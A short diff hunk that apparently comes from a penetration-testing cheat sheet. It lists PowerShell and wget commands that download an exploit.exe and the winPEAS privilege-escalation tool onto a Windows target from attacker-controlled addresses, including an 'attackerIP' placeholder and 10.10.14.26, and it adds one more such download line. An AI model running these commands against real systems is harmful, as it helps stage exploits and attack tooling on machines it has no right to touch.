@@ -10,4 +10,6 @@ powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PO
 wget "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"
 
 Invoke-WebRequest "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"
+
+iwr -uri http://192.168.10.10/winPEAS64.exe -Outfile winPEAS.exe
 ```
